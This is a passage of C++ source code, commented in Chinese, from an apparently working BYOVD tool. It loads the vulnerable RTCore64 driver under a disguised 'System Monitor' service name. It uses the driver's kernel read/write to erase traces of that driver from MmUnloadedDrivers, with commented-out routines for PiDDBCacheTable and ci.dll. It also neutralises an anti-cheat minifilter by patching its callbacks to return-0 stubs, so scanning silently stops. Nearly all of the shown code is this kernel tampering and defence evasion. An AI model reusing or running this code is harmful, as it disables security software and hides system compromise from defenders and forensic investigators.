    if (GetFileAttributesW(tempPath) == INVALID_FILE_ATTRIBUTES) return original;

    // 构建驱动信息: 使用原始设备名 \\.\RTCore64 (驱动内部硬编码)
    BYOVDDriverInfo mutated;
    // ★ BUILD 501: 固定数组用 wcscpy_s 替代 operator= — 避免 CRT 堆依赖
    wcscpy_s(mutated.devicePath, original.devicePath);     // ★ 保持原始 \\.\RTCore64
    mutated.ioctlCode = original.ioctlCode;
    mutated.needsMemoryMap = original.needsMemoryMap;
    wcscpy_s(mutated.driverPath, tempPath);

    wchar_t svcName[64] = {};
    wsprintfW(svcName, L"SysMon%s", randomHex);
    wcscpy_s(mutated.serviceName, svcName);
    wchar_t dspName[64] = {};
    wsprintfW(dspName, L"System Monitor %s", randomHex);
    wcscpy_s(mutated.displayName, dspName);

    ByovdDiag("BYOVD:Mutate: device=%ls svc=%ls path=%ls\n",
        mutated.devicePath, mutated.serviceName, mutated.driverPath);

    return mutated;
}

// ============================================================
// ★ v3.126m: KernelTraceCleaner — 清理 BYOVD 驱动加载/卸载痕迹
//
// Windows 内核在驱动程序加载和卸载时在以下结构中留下可取证痕迹:
//
//   1. MmUnloadedDrivers[50] (ntoskrnl.exe)
//      格式: RTL_UNLOADED_MODULE_DRIVER[50] 循环数组
//      每项含: UNICODE_STRING Name (驱动路径/名)
//      反作弊扫描: 遍历查找已知漏洞驱动 (RTCore64.sys, gdrv.sys 等)
//
//   2. PiDDBCacheTable (ntoskrnl.exe)
//      格式: RTL_AVL_TABLE (平衡二叉树)
//      每项含: UNICODE_STRING DriverName, LARGE_INTEGER TimeDateStamp
//      反作弊扫描: 遍历查找已知漏洞驱动的哈希/时间戳
//
//   3. g_KernelHashBucketList (ci.dll — Code Integrity)
//      格式: 哈希桶链表 (内核代码完整性缓存)
//      每项含: 驱动哈希值, 证书信息
//      反作弊扫描: 部分 AC 也会扫描 ci.dll 内部结构
//
// 策略: 使用 BYOVD 内核 R/W 直接遍历/修改这些结构,
//       移除/清零所有包含 "RTCore64" 的条目
// ============================================================

// === 内核数据结构定义 (x64) ===
// ★ v3.126m-review: 修复 — 移除 pack(1), 内核使用自然 8 字节对齐
//   pack(1) 导致 RTL_BALANCED_LINKS 被压为 28 字节, 而内核实际是 32 字节
//   这会级联导致所有后续字段偏移错误 4 字节, 写入时损坏 AVL Balance → BSOD

// RTL_BALANCED_LINKS — 内核实际布局 (sizeof=0x20=32)
struct KernRTL_BALANCED_LINKS {
    uint64_t Parent;        // +0x00
    uint64_t LeftChild;     // +0x08
    uint64_t RightChild;    // +0x10
    uint8_t  Balance;       // +0x18 (CHAR, -1/0/+1)
    uint8_t  Reserved[3];   // +0x19 (padding to 8-byte boundary)
    uint32_t IsLeftChild;   // +0x1C (BOOLEAN but padded to 4 bytes)
};

// RTL_AVL_TABLE — 内核实际布局 (sizeof=0x78=120)
struct KernRTL_AVL_TABLE {
    KernRTL_BALANCED_LINKS BalancedRoot;  // +0x00 (32 bytes)
    uint64_t OrderedPointer;              // +0x20
    uint32_t WhichOrderedElement;         // +0x28
    uint32_t NumberGenericTableElements;  // +0x2C
    uint32_t DepthOfTree;                 // +0x30
    // padding to 0x78
};

// PiDDBCacheTable 条目 — 内核实际布局
//   +0x00: RTL_BALANCED_LINKS Links (32 bytes → 到 +0x20)
//   +0x20: UNICODE_STRING  DriverName (16 bytes)
//   +0x30: LARGE_INTEGER   TimeDateStamp (8 bytes)
struct KernPiDDBCacheEntry {
    KernRTL_BALANCED_LINKS Links;         // +0x00 (32 bytes)
    uint16_t DriverNameLength;            // +0x20 (UNICODE_STRING.Length)
    uint16_t DriverNameMaxLength;         // +0x22 (UNICODE_STRING.MaximumLength)
    uint32_t Padding;                     // +0x24 (padding)
    uint64_t DriverNameBuffer;            // +0x28 (UNICODE_STRING.Buffer → 内核池 PWSTR)
    uint64_t TimeDateStamp;               // +0x30
};

// MmUnloadedDrivers 扫描参数
static const int MM_UNLOADED_MAX      = 50;    // 最多记录 50 条
static const int MM_UNLOADED_ENTRY_SZ = 0x68;  // Win10/11 RTL_UNLOADED_MODULE_DRIVER 大小

// === 辅助: 从内核池地址读取 Unicode 字符串 (Buffer 在内核池中) ===
// ★ BUILD 497: 固定缓冲区替代 std::wstring 返回值 — 避免 CRT 堆依赖
//   返回 outBuf 中实际写入的字符数 (不含 null terminator)
static int ReadKernelUnicodeString(uint64_t poolAddr, uint16_t lenBytes, wchar_t* outBuf, int outBufChars) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!poolAddr || !lenBytes || !outBuf || outBufChars <= 0) { outBuf[0] = 0; return 0; }

    uint16_t chars = lenBytes / 2;
    if (chars > (uint16_t)(outBufChars - 1)) chars = (uint16_t)(outBufChars - 1); // 安全限制

    if (kma.ReadKernelVA(poolAddr, outBuf, chars * 2)) {
        outBuf[chars] = 0;
        return chars;
    }
    outBuf[0] = 0;
    return 0;
}

// === 目标驱动名列表 — 需要从痕迹表中清除 ===
static const wchar_t* g_traceTargetNames[] = {
    L"RTCore64.sys",
    L"RTCore64",
    nullptr
};

// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
static bool IsTraceTarget(const wchar_t* name) {
    // ★ v3.126m-review: 修复 — 精确匹配 (wcsstr 包含匹配已足够, 但不误伤)
    //   只匹配全名中包含 RTCore64.sys 或 RTCore64 的条目
    for (int i = 0; g_traceTargetNames[i]; i++) {
        if (wcsstr(name, g_traceTargetNames[i]) != nullptr)
            return true;
    }
    return false;
}

// ============================================================
// 1. ClearMmUnloadedDrivers — 清除 MmUnloadedDrivers 数组
// ============================================================
bool KernelTraceCleaner::ClearMmUnloadedDrivers(uint64_t ntosBase) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:MmUnloadedDrivers: starting, ntos=0x%llX\n", (unsigned long long)ntosBase);

    // 策略: 在 IoDeleteDriver 函数中扫描 LEA 指令定位 MmUnloadedDrivers 全局变量
    //   典型指令序列 (Win10/11 x64):
    //     48 8D 0D XX XX XX XX    lea rcx, [MmUnloadedDrivers]
    //     48 8D 15 XX XX XX XX    lea rdx, [MmLastUnloadedDriver]
    //   MmUnloadedDrivers = RIP(下一条指令) + rel32
    uint64_t ioDeleteDriver = kma.ResolveExport(ntosBase, "IoDeleteDriver");
    if (!ioDeleteDriver) {
        ByovdDiag("TRACE:MmUnloadedDrivers: IoDeleteDriver not found\n");
        return false;
    }

    // 读取 IoDeleteDriver 前 512 字节 (函数体)
    uint8_t funcBytes[512] = {};
    if (!kma.ReadKernelVA(ioDeleteDriver, funcBytes, sizeof(funcBytes))) {
        ByovdDiag("TRACE:MmUnloadedDrivers: failed to read IoDeleteDriver body\n");
        return false;
    }

    uint64_t mmUnloadedAddr = 0;
    for (int i = 0; i < 500; i++) {
        // 48 8D 0D = LEA RCX, [RIP + rel32]
        if (funcBytes[i] == 0x48 && funcBytes[i+1] == 0x8D && funcBytes[i+2] == 0x0D) {
            int32_t rel32 = *(int32_t*)(funcBytes + i + 3);
            uint64_t candidate = ioDeleteDriver + i + 7 + rel32;
            // 验证: 候选地址应在 ntoskrnl 范围内
            if (candidate > ntosBase && candidate < ntosBase + 0x2000000) {
                mmUnloadedAddr = candidate;
                ByovdDiag("TRACE:MmUnloadedDrivers: found at offset +%d, addr=0x%llX\n",
                    i, (unsigned long long)mmUnloadedAddr);
                break;
            }
        }
    }

    if (!mmUnloadedAddr) {
        ByovdDiag("TRACE:MmUnloadedDrivers: array not found in IoDeleteDriver\n");
        return false;
    }

    // 读取整个数组并扫描 RTCore64 条目
    int cleared = 0;
    for (int idx = 0; idx < MM_UNLOADED_MAX; idx++) {
        uint64_t entryAddr = mmUnloadedAddr + (uint64_t)(idx * MM_UNLOADED_ENTRY_SZ);
        uint8_t entryBytes[MM_UNLOADED_ENTRY_SZ] = {};

        if (!kma.ReadKernelVA(entryAddr, entryBytes, MM_UNLOADED_ENTRY_SZ))
            continue;

        // UNICODE_STRING 在 entry 开头 (offset 0): Length(2), MaxLength(2), Buffer(8)
        uint16_t nameLen = *(uint16_t*)(entryBytes);
        uint64_t nameBuf = *(uint64_t*)(entryBytes + 8);

        if (!nameLen || !nameBuf || nameLen > 256)
            continue;

        wchar_t name[256] = {};
        int nchars = ReadKernelUnicodeString(nameBuf, nameLen, name, 256);
        if (nchars == 0) continue;

        if (IsTraceTarget(name)) {
            ByovdDiag("TRACE:MmUnloadedDrivers: [%d] found '%ls' → clearing\n", idx, name);
            // 清零 UNICODE_STRING (16 字节: Length+MaxLength+Buffer+Reserved)
            uint8_t zeros[16] = {};
            kma.WriteKernelVA(entryAddr, zeros, 16);
            cleared++;
        }
    }

    ByovdDiag("TRACE:MmUnloadedDrivers: done, cleared %d entries\n", cleared);
    return (cleared > 0);
}

// ============================================================
// 2. ClearPiDDBCacheTable — 清除 PiDDBCacheTable AVL 树
// ============================================================

// 递归遍历 AVL 树并清除匹配条目
static int TraverseAndClearPiDDBAVL(uint64_t nodeAddr, int depth) {
    if (!nodeAddr || depth > 30) return 0; // 安全: 深度上限防止无限递归

    auto& kma = KernelMemoryAccessor::Instance();
    KernPiDDBCacheEntry entry = {};
    if (!kma.ReadKernelVA(nodeAddr, &entry, sizeof(entry)))
        return 0;

    int cleared = 0;

    // 先递归左子树
    if (entry.Links.LeftChild) {
        cleared += TraverseAndClearPiDDBAVL(entry.Links.LeftChild, depth + 1);
    }
    // 再递归右子树  
    if (entry.Links.RightChild) {
        cleared += TraverseAndClearPiDDBAVL(entry.Links.RightChild, depth + 1);
    }

    // 处理当前节点
    if (entry.DriverNameLength > 0 && entry.DriverNameLength <= 256 && entry.DriverNameBuffer) {
        wchar_t name[256] = {};
        int nchars = ReadKernelUnicodeString(entry.DriverNameBuffer, entry.DriverNameLength, name, 256);
        if (nchars > 0 && IsTraceTarget(name)) {
            ByovdDiag("TRACE:PiDDBCache: found '%ls' (stamp=0x%llX) at depth=%d\n",
                name, (unsigned long long)entry.TimeDateStamp, depth);
            // 清零节点: 清除 DriverName UNICODE_STRING 和 TimeDateStamp
            //  不能删除 AVL 节点 (需要重新平衡树, 风险大), 改为使其不可识别
            //  写入 NULL Buffer 和零 Length, Name 变为空字符串
            //  ★ v3.126m-review: 偏移修正 — UNICODE_STRING 在 +0x20 (不是 +0x18)
            uint64_t fieldAddr = nodeAddr + 0x20; // UNICODE_STRING 起始
            uint8_t zeros[24] = {}; // 覆盖 Length(2)+Max(2)+pad(4)+Buffer(8)+TimeDateStamp(8)
            kma.WriteKernelVA(fieldAddr, zeros, sizeof(zeros));
            cleared++;
        }
    }

    return cleared;
}

bool KernelTraceCleaner::ClearPiDDBCacheTable(uint64_t ntosBase) {
    ByovdDiag("TRACE:PiDDBCacheTable: DISABLED (BUILD 454) — heuristic AVL scan too risky\n");
    return false;
    /* ── v3.129: 禁用 — 24MB ntoskrnl 启发式扫描 + 硬编码偏移写零 → BSOD 风险 ──
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:PiDDBCacheTable: starting, ntos=0x%llX\n", (unsigned long long)ntosBase);

    // 策略: 扫描 ntoskrnl .data 段寻找 PiDDBCacheTable AVL 树
    //   PiDDBCacheTable 位于 PiDDBLock (ERESOURCE) 附近
    //   常见模式: PiDDBLock + 0x80 = PiDDBCacheTable (Win10 21H2+)
    //   备选: 在 CipInitialize 或 PiUpdateDriverDBCache 中查找引用
    //
    //   更可靠的方案: 在 ntoskrnl 的非分页数据段中扫描 AVL 树特征
    //   特征: Root.Parent → NTOS base + 大偏移, NumberGenericTableElements > 0
    //   这里使用简化的地址范围扫描

    // 获取 ntoskrnl 大小以便限制扫描范围
    MODULEINFO modInfo = {};
    HMODULE hNtos = GetModuleHandleW(L"ntoskrnl.exe");
    if (!hNtos) {
        // 获取失败, 使用 EnumDeviceDrivers
        LPVOID drivers[256] = {};
        DWORD needed = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
            for (DWORD i = 0; i < needed / sizeof(LPVOID); i++) {
                wchar_t name[MAX_PATH] = {};
                GetDeviceDriverBaseNameW(drivers[i], name, MAX_PATH);
                if (_wcsicmp(name, L"ntoskrnl.exe") == 0) {
                    hNtos = (HMODULE)drivers[i];
                    break;
                }
            }
        }
    }

    // 扫描 ntoskrnl .data 段 (基址 + 0x100000 ~ 基址 + 0x200000 大致范围)
    //  寻找 AVL 树: 结构体 0x78 字节, Root.LeftChild/Root.RightChild 非零
    //  且 NumberGenericTableElements > 0 且 < 1000 (缓存表通常有几十到几百条)
    uint64_t scanStart = ntosBase + 0x800000;  // .data 段大致起始
    uint64_t scanEnd   = ntosBase + 0x2000000; // 上限定为 32MB 内
    uint64_t foundTable = 0;

    // 内存映射扫描: 每次读取 64KB 块
    // ★ BUILD 497: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT, PAGE_READWRITE);
    if (!chunk) return false;
    for (uint64_t addr = scanStart; addr < scanEnd; addr += 0x10000) {
        if (!kma.ReadKernelVA(addr, chunk, 0x10000))
            continue;

        for (size_t off = 0; off < 0x10000 - 0x78; off += 8) {
            KernRTL_AVL_TABLE* table = (KernRTL_AVL_TABLE*)(chunk + off);
            uint64_t actualAddr = addr + off;

            // 验证 AVL 表头:
            //   1. Root.Parent 应指向 ntoskrnl 基址附近
            //   2. NumberGenericTableElements 在合理范围 (1-1000)
            //   3. DepthOfTree 在合理范围 (1-20)
            //   4. Root.LeftChild 或 Root.RightChild 非零 (非空树)
            uint32_t count = table->NumberGenericTableElements;
            uint32_t depth = table->DepthOfTree;

            if (count >= 1 && count <= 1000 && depth >= 1 && depth <= 20) {
                uint64_t parentAddr = table->BalancedRoot.Parent;
                if (parentAddr > ntosBase && parentAddr < ntosBase + 0x2000000) {
                    // 父节点的根指针有意义
                    if (table->BalancedRoot.LeftChild || table->BalancedRoot.RightChild) {
                        foundTable = actualAddr;
                        ByovdDiag("TRACE:PiDDBCacheTable: candidate at 0x%llX (elements=%u depth=%u)\n",
                            (unsigned long long)foundTable, count, depth);
                        break;
                    }
                }
            }
        }
        if (foundTable) break;
    }

    // 备选: 如果扫描没找到, 尝试搜索 PiDDBLock 附近的 AVL 表
    if (!foundTable) {
        ByovdDiag("TRACE:PiDDBCacheTable: scan not found, trying PiDDBLock proximity...\n");
        // PiDDBLock 在 ntoskrnl data 段, 是一个 ERESOURCE 结构
        // 特征: OwnerTable = 0, ActiveCount = 0, ContentionCount = 0
        // 且通常前后有合法的内核地址
        for (uint64_t addr = scanStart; addr < scanEnd; addr += 0x1000) {
            if (!kma.ReadKernelVA(addr, chunk, 0x1000))
                continue;
            for (size_t off = 0; off < 0x1000 - 0x100; off += 8) {
                // 查找可能的 AVL 表: 扫描表头 0x78 字节后的区域
                // PiDDBLock + 0x80 处常有 0 的 ERESOURCE 和 AVL 表
                KernRTL_AVL_TABLE* table = (KernRTL_AVL_TABLE*)(chunk + off);
                if (table->NumberGenericTableElements >= 1 &&
                    table->NumberGenericTableElements <= 500 &&
                    table->DepthOfTree >= 1 && table->DepthOfTree <= 20) {
                    uint64_t actualAddr = addr + off;
                    uint64_t rootNode = 0;
                    // RTL_AVL_TABLE.BalancedRoot 是内嵌的 links,
                    //   RTL_BALANCED_LINKS 本身不直接指向节点,
                    //   而是节点的左/右孩子
                    // 查看是否有有效的子节点
                    uint8_t rootBytes[sizeof(KernRTL_AVL_TABLE)] = {};
                    if (kma.ReadKernelVA(actualAddr, rootBytes, sizeof(rootBytes))) {
                        auto* rt = (KernRTL_AVL_TABLE*)rootBytes;
                        if (rt->BalancedRoot.LeftChild || rt->BalancedRoot.RightChild) {
                            foundTable = actualAddr;
                            ByovdDiag("TRACE:PiDDBCacheTable: found via proximity at 0x%llX\n",
                                (unsigned long long)foundTable);
                            break;
                        }
                    }
                }
            }
            if (foundTable) break;
        }
    }

    if (!foundTable) {
        ByovdDiag("TRACE:PiDDBCacheTable: table not found\n");
        VirtualFree(chunk, 0, MEM_RELEASE);
        return false;
    }

    // 读取 AVL 表的根节点并开始遍历
    KernRTL_AVL_TABLE table = {};
    if (!kma.ReadKernelVA(foundTable, &table, sizeof(table))) {
        VirtualFree(chunk, 0, MEM_RELEASE);
        return false;
    }

    // 根节点的 "LeftChild" 实际上是整个树的根
    // RTL_AVL_TABLE.BalancedRoot.LeftChild → 树根
    uint64_t treeRoot = table.BalancedRoot.LeftChild;
    if (!treeRoot) {
        // 备选: Parent 也可能是根
        treeRoot = table.BalancedRoot.Parent;
    }

    int cleared = 0;
    if (treeRoot) {
        cleared = TraverseAndClearPiDDBAVL(treeRoot, 0);
    } else {
        ByovdDiag("TRACE:PiDDBCacheTable: empty tree (root=0)\n");
    }

    ByovdDiag("TRACE:PiDDBCacheTable: done, cleared %d entries, table had %u elements\n",
        cleared, table.NumberGenericTableElements);
    VirtualFree(chunk, 0, MEM_RELEASE);
    return (cleared > 0);
    ── v3.129 end ── */
}

// ============================================================
// 3. ClearCiHashBucket — 清除 ci.dll KernelHashBucketList
// ============================================================
bool KernelTraceCleaner::ClearCiHashBucket(uint64_t ciBase) {
    ByovdDiag("TRACE:CiHashBucket: DISABLED (BUILD 453) — heuristic scan too risky\n");
    return false;
    /* ── v3.128: 禁用 — 启发式扫描 ci.dll 数据段 + 写零导致 BSOD ──
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:CiHashBucket: starting, ci.dll=0x%llX\n", (unsigned long long)ciBase);

    if (!ciBase) {
        ByovdDiag("TRACE:CiHashBucket: ci.dll not loaded, skip\n");
        return false;
    }

    // ci.dll 的 g_KernelHashBucketList 是一个哈希桶链表
    //   位于 ci.dll 的 .data 段, 具体偏移未知
    //   每个桶条目包含: 驱动哈希, 证书链, 文件名
    // 策略: 扫描 ci.dll 的 .data 段寻找包含 "RTCore64" 字符串的哈希条目

    // ★ v3.126m-review: 修复 — 缩减扫描范围到 3MB (ci.dll 典型大小 < 2MB)
    uint64_t ciDataStart = ciBase + 0x10000;  // ci.dll .data 段大致起始
    uint64_t ciDataEnd = ciBase + 0x300000;    // ci.dll 典型大小 ~1.5MB, 上限 3MB

    int cleared = 0;
    // 逐页扫描 ci.dll 的数据段
    for (uint64_t addr = ciDataStart; addr < ciDataEnd; addr += 0x1000) {
        uint8_t page[0x1000] = {};
        if (!kma.ReadKernelVA(addr, page, sizeof(page)))
            continue;

        // ★ v3.126m-review: 修复 — off 从 8 开始 (防止 page + off - 8 越界读取栈前数据)
        for (size_t off = 8; off < sizeof(page) - 32; off++) {
            // 寻找可能的 Unicode 字符串指针 → 池地址 (高位地址, 不在 ci.dll 模块内)
            uint64_t strPtr = *(uint64_t*)(page + off);
            uint16_t strLen = *(uint16_t*)(page + off - 8);
            uint16_t strMax = *(uint16_t*)(page + off - 6);

            if (strPtr > 0xFFFF800000000000ULL && // 内核池地址范围
                strLen > 0 && strLen <= 256 && strLen <= strMax &&
                strLen % 2 == 0) {

                wchar_t name[256] = {};
                int nchars = ReadKernelUnicodeString(strPtr, strLen, name, 256);
                if (nchars > 0 && IsTraceTarget(name)) {
                    ByovdDiag("TRACE:CiHashBucket: found '%ls' at ci+0x%zX → clearing\n",
                        name, (size_t)(addr + off - 8 - ciBase));
                    // 清零 UNICODE_STRING (16 bytes: Length+MaxLength+Buffer+pad)
                    uint8_t zeros[16] = {};
                    kma.WriteKernelVA(addr + off - 8, zeros, 16);
                    cleared++;
                }
            }
        }
    }

    ByovdDiag("TRACE:CiHashBucket: done, cleared %d entries\n", cleared);
    return (cleared > 0);
    ── v3.128 end ── */
}

// ============================================================
// CleanAllTraces — 一键清理全部痕迹
// ============================================================
bool KernelTraceCleaner::CleanAllTraces() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("TRACE:CleanAllTraces: BYOVD not active, skip\n");
        return false;
    }

    // ★ v3.128: PAC 未加载则跳过所有痕迹清理 — 没有反作弊驱动可以检测我们
    uint64_t pacBase = kma.GetKernelModuleBase("MessageTransfer.sys");
    if (!pacBase) {
        ByovdDiag("TRACE:CleanAllTraces: PAC driver not loaded, skip all trace cleaning\n");
        return false;
    }

    ByovdDiag("TRACE:CleanAllTraces: === STARTING KERNEL TRACE CLEANUP ===\n");

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    uint64_t ciBase   = kma.GetKernelModuleBase("ci.dll");

    ByovdDiag("TRACE:CleanAllTraces: ntos=0x%llX ci=0x%llX\n",
        (unsigned long long)ntosBase, (unsigned long long)ciBase);

    int successCount = 0;

    // 1. MmUnloadedDrivers — 最容易被检查的表
    if (ClearMmUnloadedDrivers(ntosBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: MmUnloadedDrivers — no entries found or cleared\n");
    }

    // 2. PiDDBCacheTable — AVL 树缓存
    if (ClearPiDDBCacheTable(ntosBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: PiDDBCacheTable — no entries found or cleared\n");
    }

    // 3. ci.dll KernelHashBucketList — Code Integrity 缓存
    if (ClearCiHashBucket(ciBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: CiHashBucket — no entries found or cleared\n");
    }

    ByovdDiag("TRACE:CleanAllTraces: === COMPLETE (%d/3 tables modified) ===\n", successCount);
    return (successCount > 0);
}

// ============================================================
// ★ v3.126n: MinifilterNeutralizer — 中和而非卸载 MessageTransfer

// ★ v3.126p: 前向声明 — PAC 模块函数 (实现在 MinifilterNeutralizer 之后)
// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
static uint64_t FindPacFilterInKernel(uint64_t fltmgrBase, uint64_t fltGlobals, wchar_t* outName, int outNameChars);
static bool IsPacPattern(const wchar_t* name);
static const wchar_t* GetPacTargetName();
//
// 此前方案: FilterUnload → 卸载 minifilter → PAC 客户端检测到缺失
// 新方案:   不卸载, 用 BYOVD 内核 R/W 替换所有操作回调为无害 stub
//           → minifilter 仍出现在 FilterFindFirst 列表中
//           → 所有文件操作回调返回 FLT_PREOP_SUCCESS_NO_CALLBACK(=0)
//           → PAC 平台满意, 但文件扫描完全失效
//
// fltmgr.sys 内部结构遍历:
//   FltGlobals → FrameList → FLTP_FRAME.FilterList
//   → FLT_FILTER.ActiveLink(+0x00) → 下一个 FLT_FILTER
//
// FLT_FILTER 关键字段 (Win10 22H2 / Win11 22H2, x64):
//   +0x008:  Name.UNICODE_STRING (16 bytes)
//           此偏移因版本而异, 使用运行时 sigscan 动态定位
//   +0x2A8:  Operations 指针 (FLT_OPERATION_REGISTRATION*)
//           每个条目 0x20 bytes: MajorFunction(1)+pad(3)+Flags(4)+
//                                PreOp(8)+PostOp(8)+Reserved(8)
//
// Stub 代码: XOR EAX, EAX; RET = {0x33, 0xC0, 0xC3}
//   在 fltmgr.sys 中扫描此特征码, 复用已有指令作为 stub 目标
// ============================================================

// FLT_OPERATION_REGISTRATION 内核实际布局 (x64, 自然对齐)
struct KernFltOpReg {
    uint8_t  MajorFunction;   // +0x00 IRP_MJ_*
    uint8_t  _pad[3];         // +0x01
    uint32_t Flags;           // +0x04
    uint64_t PreOperation;    // +0x08
    uint64_t PostOperation;   // +0x10
    uint64_t Reserved1;       // +0x18
}; // sizeof = 0x20

// FLT_FILTER 简化布局 — 运行时不需要完整结构体
//   关键偏移通过 sigscan 动态检测, 不硬编码

// Stub 代码: return 0 (FLT_PREOP_SUCCESS_NO_CALLBACK / FLT_POSTOP_FINISHED_PROCESSING)
#define STUB_RET0_BYTES {0x33, 0xC0, 0xC3}  // XOR EAX, EAX; RET

// 在 fltmgr.sys 内核镜像中扫描 "return 0" stub
static uint64_t FindRet0Stub(uint64_t fltmgrBase, uint64_t fltmgrSize) {
    auto& kma = KernelMemoryAccessor::Instance();
    const uint8_t stub[] = STUB_RET0_BYTES;

    // 扫描 fltmgr.sys 的代码段 (.text, 通常在基址 +0x1000 到 +0x300000)
    uint64_t scanStart = fltmgrBase + 0x1000;
    uint64_t scanEnd = scanStart + (fltmgrSize > 0x300000 ? 0x300000 : fltmgrSize - 0x1000);

    // ★ BUILD 497: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT, PAGE_READWRITE);
    if (!chunk) return 0;
    for (uint64_t addr = scanStart; addr < scanEnd; addr += 0x10000) {
        if (!kma.ReadKernelVA(addr, chunk, 0x10000))
            continue;
        for (size_t off = 0; off < 0x10000 - 3; off++) {
            if (chunk[off] == stub[0] && chunk[off+1] == stub[1] && chunk[off+2] == stub[2]) {
                uint64_t stubAddr = addr + off;
                ByovdDiag("FLT:NTRL: found ret0 stub at fltmgr+0x%llX\n",
                    (unsigned long long)(stubAddr - fltmgrBase));
                VirtualFree(chunk, 0, MEM_RELEASE);
                return stubAddr;
            }
        }
    }
    VirtualFree(chunk, 0, MEM_RELEASE);
    ByovdDiag("FLT:NTRL: ret0 stub not found in fltmgr\n");
    return 0;
}

// BUILD 467: Win11 兼容 — 新增 MOV RXX, imm64 (绝对地址) 模式
// 旧模式: LEA/MOV RXX, [RIP+rel32] (RIP-relative)
// 新模式: MOV RXX, imm64      (Win11 用绝对地址编码全局变量引用)
// ★ BUILD 475: 扩展扫描范围到 16KB + 新增 MOV [abs] 模式
static uint64_t ScanFuncForFltGlobals(uint64_t fltmgrBase, uint64_t targetFunc) {
    auto& kma = KernelMemoryAccessor::Instance();
    uint8_t buf[512] = {};

    for (int chunk = 0; chunk < 32; chunk++) {
        if (!kma.ReadKernelVA(targetFunc + chunk * 512, buf, sizeof(buf)))
            break;

        for (int i = 0; i < 500; i++) {
            // 模式1: LEA/MOV RXX, [RIP+rel32]: 48/4C/4D prefix + 8D/8B + ModRM [RIP]
            if ((buf[i] == 0x48 || buf[i] == 0x4C || buf[i] == 0x4D) &&
                (buf[i+1] == 0x8D || buf[i+1] == 0x8B) &&
                (buf[i+2] & 0xC7) == 0x05) {
                int32_t rel32 = *(int32_t*)(buf + i + 3);
                uint64_t candidate = targetFunc + chunk * 512 + i + 7 + rel32;
                if (candidate > fltmgrBase + 0x2000 && candidate < fltmgrBase + 0x200000) {
                    return candidate;
                }
            }
            // BUILD 467 模式2: MOV RXX, imm64 (Win11)
            //   48 B8~BF + 8字节立即数 — 直接引用全局地址
            else if (buf[i] == 0x48 && (buf[i+1] & 0xF8) == 0xB8 && i <= 492) {
                uint64_t absAddr = *(uint64_t*)(buf + i + 2);
                if (absAddr > fltmgrBase + 0x2000 && absAddr < fltmgrBase + 0x200000) {
                    return absAddr;
                }
            }
            // BUILD 475 模式3: MOV RAX, [absolute_address]
            //   48 A1 + 8字节绝对地址 (MOV RAX, moffs64)
            //   VS2022 在 Win11 上有时会生成此模式访问 .data 段
            else if (buf[i] == 0x48 && buf[i+1] == 0xA1 && i <= 491) {
                uint64_t absAddr = *(uint64_t*)(buf + i + 2);
                if (absAddr > fltmgrBase + 0x2000 && absAddr < fltmgrBase + 0x200000) {
                    return absAddr;
                }
            }
            // BUILD 475 模式4: MOV RAX, [RBX + imm32] — Win11 SIB 变体
            //   48 8B 83 XX XX XX XX — 通过寄存器基址访问 .data 段
            //   但需要验证计算后的地址是否在 .data 范围 — 此处跳过 (运行时依赖寄存器)
        }
    }
    return 0;
}

// ============================================================
// ★ BUILD 475: Win11 兼容 — 直接扫描 fltmgr .data 段找 FltGlobals
//
// 原理 (不依赖编译器指令编码):
//   FLT_GLOBALS 是一个巨大的全局结构体，位于 fltmgr.sys 的 .data 段
//   其第一个字段 FrameList 是一个 LIST_ENTRY (双向链表头):
//     +0x00: FrameList.Flink → 第一个 FLTP_FRAME
//     +0x08: FrameList.Blink → 最后一个 FLTP_FRAME
//
//   LIST_ENTRY 双向链表头的关键特征:
//     Flink->Blink == &head  (前一个节点的 Blink 指向链表头)
//
// 扫描策略:
//   1. 遍历 fltmgr .data 段, 找所有 16 字节对齐的 LIST_ENTRY
//   2. 每个候选: Flink/Blink 必须是内核地址且在 fltmgr 模块范围内
//   3. 验证回指: *(Flink + 8) 必须等于候选地址 (Flink->Blink == &head)
//   4. 交叉引用: 候选地址被至少 1 个已知 fltmgr 函数引用
// ============================================================
static uint64_t ScanDataSectionForFltGlobals(uint64_t fltmgrBase) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:NTRL: === .data section scan for FltGlobals (BUILD 475) ===\n");

    // 解析 PE 头获取 .data 段范围
    IMAGE_DOS_HEADER dos = {};
    if (!kma.ReadKernelVA(fltmgrBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    uint64_t ntHdrVA = fltmgrBase + dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (!kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    uint64_t imageSize = nt.OptionalHeader.SizeOfImage;
    WORD numSections = nt.FileHeader.NumberOfSections;

    // 读段表 — VirtualAlloc 代替 std::vector
    DWORD secTableSize = numSections * sizeof(IMAGE_SECTION_HEADER);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)VirtualAlloc(
        nullptr, secTableSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sections) {
        ByovdDiag("FLT:NTRL: .data scan - VirtualAlloc for sections failed\n");
        return 0;
    }

    uint64_t secTableVA = ntHdrVA + sizeof(IMAGE_NT_HEADERS64);
    if (!kma.ReadKernelVA(secTableVA, sections, secTableSize)) {
        VirtualFree(sections, 0, MEM_RELEASE);
        return 0;
    }

    // 找 .data 段 (或最大的 RW 段)
